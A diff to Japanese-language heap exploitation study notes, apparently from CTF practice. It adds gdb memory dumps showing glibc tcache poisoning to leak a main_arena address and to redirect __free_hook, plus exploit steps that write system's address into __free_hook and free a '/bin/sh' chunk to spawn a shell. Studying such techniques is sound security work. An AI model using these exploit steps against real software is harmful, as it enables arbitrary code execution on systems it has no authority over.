@@ -412,7 +412,56 @@ pwndbg> x/16gx 0x555555757230
 0x5555557572a0:	0x0000000000000000	0x0000000000020d61
 pwndbg> 
 ```
+#### Heap overlap
 
+```txt
+--------------------------------------------------------------------------------
+例１）main_arenaのアドレスleakの際に使用
+状態：tcache[0x20]がoverlapしている。
+再現方法：tcache[0x20]に入っているアドレス(0x555555757ab0)の値をaddr_leakに書き換える
+(0x20)   tcache_entry[0](1): 0x555555757ab0 --> addr_leak(leakしたいものがあるアドレス) 
+この後に0x20sizeを二回mallocすることで(freeは今回はどっちでもよい)、mallocがaddr_leakを返すようになる
+
+                  top: 0x555555757c30 (size : 0x203d0)
+       last_remainder: 0x555555757ac0 (size : 0x100) 
+            unsortbin: 0x555555757ac0 (size : 0x100)
+(0x20)   tcache_entry[0](1): 0x555555757ab0 --> 0x555555757ad0 (overlap chunk with 0x555555757ac0(freed) )
+(0x100)   tcache_entry[14](6): 0x555555757800 --> 0x5555557576c0 --> 0x555555757590 --> 0x555555757470 --> 0x555555757360 --> 0x555555757260
+gdb-peda$ x/32gx 0x555555757a60
+0x555555757a60: 0x3636363636363636      0x3636363636363636
+0x555555757a70: 0x3636363636363636      0x3636363636363636
+0x555555757a80: 0x3636363636363636      0x0000000000000041
+0x555555757a90: 0x0000555555757a80      0x0000555555757a80
+0x555555757aa0: 0x0000000000000000      0x0000000000000041
+0x555555757ab0: 0x0000555555757ad0      0x555555757000
+0x555555757ac0: 0x0000000000000040      0x0000000000000101
+0x555555757ad0: 0x00007ffff7dcfca0      0x00007ffff7dcfca0 <- tcache[0x20]の0x555555757ad0が0x00007ffff7dcfca0を指している！
+0x555555757ae0: 0x3737373737373737      0x3737373737373737
+
+--------------------------------------------------------------------------------
+例2）system("/bin/sh")を呼び出し
+状態：tcache[0x100]がoverlapしている
+再現方法：tcache[0x100]に入っているアドレス(0x555555757ad0)の値を_free_hookに書き換える
+(0x100)   tcache_entry[14](7): 0x555555757ad0  -> _free_hook(0x00007ffff7dd18e8)
+この後に、2回0x100サイズをmallocすることで、mallocが_free_hookを返し、そこをaddr_libc_systemに書き換えられる！
+
+                  top: 0x555555757c30 (size : 0x203d0)
+       last_remainder: 0x555555757ac0 (size : 0x100) 
+            unsortbin: 0x555555757ac0 (doubly linked list corruption 0x555555757ac0 != 0x7ffff7dcbd60 and 0x555555757ac0 is broken)
+(0x20)   tcache_entry[0](255): 0x7ffff7dcfca0 --> 0x555555757c30
+(0x40)   tcache_entry[2](1): 0x555555757ab0
+(0x100)   tcache_entry[14](7): 0x555555757ad0 (overlap chunk with 0x555555757aa0(freed) )
+gdb-peda$ x/32gx 0x555555757a60
+0x555555757a60: 0x3636363636363636      0x3636363636363636
+0x555555757a70: 0x3636363636363636      0x3636363636363636
+0x555555757a80: 0x3636363636363636      0x0000000000000041
+0x555555757a90: 0x0000555555757a80      0x0000555555757a80
+0x555555757aa0: 0x0000000000000000      0x0000000000000041
+0x555555757ab0: 0x0000000000000000      0x555555757010
+0x555555757ac0: 0x5a5a5a5a5a5a5a5a      0x0000000000000101
+0x555555757ad0: 0x00007ffff7dd18e8      0x00007ffff7dcfc00 <- tcache[0x100]の0x555555757ad0が0x00007ffff7dd18e8(_free_hook)を指している
+0x555555757ae0: 0x3737373737373737      0x3737373737373737
+```
 #### off-by-one-errorでchunk sizeを書き換えてヒープのleak
 off-by-one-errorでchunk sizeを書き換えて、tcacheを同じサイズをリンクすることで、ヒープのアドレスをleakする   
 ```txt
@@ -751,11 +800,23 @@ gdb-peda$ x/32gx 0x555555757a60
 0x555555757ae0: 0x3737373737373737      0x3737373737373737
 
 
-次に0x100サイズmallocすれば、0x555555757ad0がmallocによって返り、nextの0x00007ffff7dd18e8がtcache[0x100]に入る
-そのあと、freeせずにまた0x100サイズmallocすれば、0x00007ffff7dd18eがmallocによって返り、_free_hookアドレスにp64(addr_libc_system)を書き込める！
+    ch.alloc(0xf8, '0') [1]
+    ch.wipe()
+
+    ch.alloc(0xf8, p64(addr_libc_system)) [2]
+    ch.wipe()
+
+    ch.alloc(0x38, '/bin/sh') [3]
+    ch.delete(False) [4]
+    
+[1] 次に0x100サイズmallocすれば、0x555555757ad0がmallocによって返り、nextの0x00007ffff7dd18e8がtcache[0x100]に入る
+
+[2] そのあと、freeせずにまた0x100サイズmallocすれば、0x00007ffff7dd18eがmallocによって返り、_free_hookアドレスにp64(addr_libc_system)を書き込める！
     これで、次にfreeするとsystem関数が実行される！
-そのあと、freeせずに適当なサイズ(0x40とか)mallocし、"/bin/sh"をmallocが返したアドレスに書き込む
-この後にfreeすれば、system("/bin/sh")が実行される！
+    
+[3] そのあと、freeせずに適当なサイズ(0x40とか)mallocし、"/bin/sh"をmallocが返したアドレスに書き込む
+
+[4] この後にfreeすれば、system("/bin/sh")が実行される！
     free関数はfree(content)となっており、contentはmallocが返したアドレスを指している
     このとき、content(というアドレス)には"/bin/sh"という文字列が入っている
     なので、free(content)はsystem(content)と同じであり、content="/bin/sh"なのでsystem("/bin/sh")が実行される！
